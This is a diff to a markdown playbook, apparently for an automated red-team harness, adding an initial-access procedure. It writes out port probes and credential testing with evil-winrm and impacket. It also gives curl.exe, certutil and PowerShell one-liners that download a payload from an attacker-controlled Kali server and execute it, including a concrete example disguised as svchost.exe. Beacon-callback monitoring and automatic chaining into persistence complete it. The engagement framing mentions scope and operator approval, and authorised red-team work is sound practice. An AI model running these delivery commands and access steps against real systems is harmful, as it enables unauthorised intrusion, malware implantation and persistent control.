@@ -27,7 +27,7 @@ incomplete — report back to master, do not proceed.
 
 ## Entry criteria
 
-- **Target marked REACHABLE** in recon Phase 0 reachability matrix (MANDATORY)
+- **Target classified `confirmed`** in engagement state (MANDATORY — replaces legacy REACHABLE check)
 - **Obsidian target page exists** with completed research (services, CVEs, PoCs)
 - Attack vectors ranked and operator-approved
 - Target explicitly in scope (RT-TGT-001 confirmed)
@@ -63,6 +63,154 @@ incomplete — report back to master, do not proceed.
   after all CVE/exploit paths exhausted AND operator approves.
 - **>10 password attempts per service = OPSEC violation.** Log it as such.
 - Version-specific CVE exploit > credential guessing. Always.
+
+## Access Method Probe Sequence
+
+**Run BEFORE technique research.** Determines which access methods work on
+the target. Results feed Phase 1 vector selection — skip researching vectors
+for ports that are closed.
+
+Execute from Kali agent. Each probe has 30-second timeout. Probe in order:
+
+### Probe 1: SSH (port 22/TCP)
+
+```
+nmap -Pn -sS -p 22 --max-retries 1 --host-timeout 30s <target>
+```
+
+If OPEN: test auth with harvested/default creds (max 3-5 attempts per
+fail2ban rules). If auth succeeds → SSH is primary access method.
+Record: `access_methods: [ssh]` with credential used.
+
+### Probe 2: WinRM (ports 5985/TCP HTTP, 5986/TCP HTTPS)
+
+```
+nmap -Pn -sS -p 5985,5986 --max-retries 1 --host-timeout 30s <target>
+```
+
+If OPEN: test auth with harvested/default creds via Tuoni agent or
+`evil-winrm` from Kali. If auth succeeds → WinRM is primary access method.
+Record: `access_methods: [winrm]` with credential and port used.
+
+### Probe 3: SMB Exec (port 445/TCP)
+
+```
+nmap -Pn -sS -p 445 --max-retries 1 --host-timeout 30s <target>
+```
+
+If OPEN: test with harvested/default creds via impacket (psexec, smbexec,
+wmiexec). Try in order: smbexec (quieter) → wmiexec → psexec (noisiest).
+If any succeeds → SMB exec is access method.
+Record: `access_methods: [smb_exec]` with tool and credential used.
+
+### Probe 4: RDP Fallback (port 3389/TCP)
+
+```
+nmap -Pn -sS -p 3389 --max-retries 1 --host-timeout 30s <target>
+```
+
+If OPEN: RDP requires operator GUI interaction. Cannot be automated.
+Trigger RDP Beacon Delivery Workflow (see below).
+Record: `access_methods: [rdp]` — operator-assisted.
+
+### Probe Result Handling
+
+```yaml
+# Written to Obsidian target page § Access Methods
+access_probe:
+  timestamp: <ISO8601>
+  results:
+    ssh:    { port: 22,   state: open|closed|filtered, auth: success|failed|skipped }
+    winrm:  { port: 5985, state: open|closed|filtered, auth: success|failed|skipped }
+    smb:    { port: 445,  state: open|closed|filtered, auth: success|failed|skipped }
+    rdp:    { port: 3389, state: open|closed|filtered, auth: skipped }
+  primary_method: <first successful method, or "rdp" if only RDP open>
+  fallback_methods: <other open methods in probe order>
+```
+
+**When ALL probes fail** (all ports closed/filtered, or open but auth fails):
+
+1. Report to operator: "No automated access path. All probes failed."
+2. List what was tried and results per method
+3. Suggest: staged payload delivery if any port accepts inbound connections
+4. Provide manual intervention instructions:
+   - Stage payload on Kali HTTP server (`tuoni_payload_create` + file server)
+   - Template command for operator to deliver via out-of-band access
+   - Use curl.exe template from Delivery Templates section if Windows target
+5. Record: `access_methods: [manual]` — requires operator intervention
+
+**Method priority override:** If engagement YAML specifies `preferred_access`,
+use that method first regardless of probe order. Still probe all methods and
+record results.
+
+## RDP Beacon Delivery Workflow
+
+Triggered when access probe determines RDP is the only available method
+(or operator selects RDP explicitly). This is an operator-assisted workflow —
+harness stages everything, operator pastes one command.
+
+### Step 1: Stage Payload on Kali HTTP Server
+
+```
+1. Generate payload: tuoni_payload_create (cover name per RT-SIG-003)
+2. Verify Tuoni file server active on port 8080:
+   tuoni_listeners_list → confirm HTTP file server listener
+3. If no file server: start python3 HTTP server on Kali as fallback:
+   ssh kali 'cd /tmp/payloads && python3 -m http.server 8080 &'
+4. Verify payload accessible:
+   ssh kali 'curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/files/<payload>'
+   Expected: 200
+```
+
+### Step 2: Generate One-Liner for Operator
+
+Using curl.exe template from Delivery Templates section:
+
+```
+Operator instruction:
+  1. In RDP session, open cmd.exe (Win+R → cmd)
+  2. Paste and run:
+
+     curl.exe http://<KALI_IP>:8080/files/<PAYLOAD> -o %TEMP%\<COVER_NAME>.exe && %TEMP%\<COVER_NAME>.exe
+
+  3. Close cmd window after execution
+```
+
+Print this to operator with concrete values filled in. Include:
+- Kali IP (from engagement config or `ssh kali 'hostname -I'`)
+- Payload filename (from step 1)
+- Cover name (from RT-SIG-003)
+- Fallback commands (certutil, PowerShell) if curl.exe fails
+
+### Step 3: Monitor for Beacon Callback
+
+After giving operator the command, poll for new agent:
+
+```
+1. Record current agent list: tuoni_agents_list → baseline_agents
+2. Notify operator: "Paste the command now. Monitoring for callback..."
+3. Poll tuoni_agents_list every 15 seconds for up to 5 minutes
+4. New agent = agent not in baseline_agents, matching target IP
+5. On callback detected:
+   - Confirm agent alive: tuoni_agent_command (whoami)
+   - Record agent ID in Obsidian target page § Access
+   - Print: "Beacon live — agent <ID> on <hostname>. Switching to harness mode."
+   - Auto-chain: invoke persist-swarm (Phase 3 step 4)
+```
+
+**If no callback after 5 minutes:**
+1. Check: did operator paste the command? (ask)
+2. Check: is target DNS/routing correct? (`tuoni_agents_list` from foothold)
+3. Check: is firewall blocking outbound from target to Kali?
+4. Suggest: try HTTPS template, try certutil fallback, try PowerShell fallback
+5. If still no callback: escalate to operator for manual troubleshooting
+
+### Step 4: Handoff to Harness
+
+On beacon callback, execution model switches immediately:
+- Operator steps back from RDP
+- Harness takes over via Tuoni agent
+- Continue with Phase 3 step 4 (persist-swarm) and Phase 4 (post-access)
 
 ## Phases
 
@@ -171,6 +319,12 @@ This gate prevents the "enumerate → try passwords → report blocked" pattern.
 
 **Credential testing:** Max 3-5 product defaults per service ONLY. Never brute
 force. After defaults fail, exploit research is the path forward, not more passwords.
+
+**Nextcloud OCS API false-positive trap:** Nextcloud returns HTTP 200 for ALL
+OCS API requests when LDAP backend is broken. Real auth status is in response
+body field `statuscode` (e.g., `996` = auth failure). Any credential testing
+against Nextcloud MUST parse body `statuscode`, not HTTP status. Hydra and
+similar tools checking only HTTP status will report false positives.
 
 ### Phase 2: Payload Preparation
 
@@ -309,10 +463,20 @@ outcome. This prevents re-trying exhausted vectors in future sessions.
 
 ## State writes
 
+On successful initial access, invoke engagement-state **Reclassify Target**:
+`confirmed` → `compromised` with agent ID and technique as evidence.
+
+On all vectors exhausted without success:
+`confirmed` → `hardened` (3+ logged technique attempts required).
+
+On specific CVE confirmed patched:
+`confirmed` → `patched` with version/response evidence.
+
 ```yaml
 # engagement.yaml updates
 targets:
   - hostname: <target>
+    classification: compromised
     phase: initial_access
     access:
       agent_id: <tuoni agent ID>
@@ -409,6 +573,56 @@ marks broken vulns, but unlisted vulns may also be non-functional.
 3. Cross-reference with GitLab README for deploy status
 4. If 2+ vectors fail on same target: suspect Providentia data issue, not
    technique failure. Report to operator.
+
+## Delivery Templates
+
+### curl.exe Beacon Delivery (Windows RDP / GUI-only targets)
+
+Use when operator must paste a command in an RDP cmd prompt or similar
+GUI-only access. Parameterized — no hardcoded IPs or paths.
+
+**Parameters:**
+- `LISTENER_URL` — Tuoni listener base URL (HTTP or HTTPS, include port)
+- `PAYLOAD_PATH` — path on Kali HTTP server (relative to server root)
+- `OUTPUT_PATH` — local path on target for payload drop
+
+**HTTP template (Tuoni file server at port 8080):**
+
+```cmd
+curl.exe http://<LISTENER_URL>/files/<PAYLOAD_PATH> -o <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**HTTPS template (Tuoni HTTPS listener):**
+
+```cmd
+curl.exe -k https://<LISTENER_URL>/files/<PAYLOAD_PATH> -o <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**Example (concrete):**
+
+```cmd
+curl.exe http://10.10.14.5:8080/files/svchost.exe -o %TEMP%\svchost.exe && %TEMP%\svchost.exe
+```
+
+**Rules:**
+- Payload filename per RT-SIG-003 (platform-appropriate cover name)
+- `OUTPUT_PATH` defaults to `%TEMP%\<cover_name>.exe` — writable without admin
+- `-k` flag on HTTPS skips cert validation (self-signed Tuoni cert)
+- `&&` chains execution only on successful download — prevents running stale files
+- Verify listener is active (`tuoni_listeners_list`) before giving operator the command
+- Stage payload on Kali HTTP server before generating the command
+
+**certutil fallback** (if curl.exe unavailable — older Windows):
+
+```cmd
+certutil -urlcache -split -f http://<LISTENER_URL>/files/<PAYLOAD_PATH> <OUTPUT_PATH> && <OUTPUT_PATH>
+```
+
+**PowerShell fallback** (if cmd restricted but PowerShell available):
+
+```powershell
+Invoke-WebRequest -Uri "http://<LISTENER_URL>/files/<PAYLOAD_PATH>" -OutFile "<OUTPUT_PATH>"; Start-Process "<OUTPUT_PATH>"
+```
 
 ## Failure modes
 
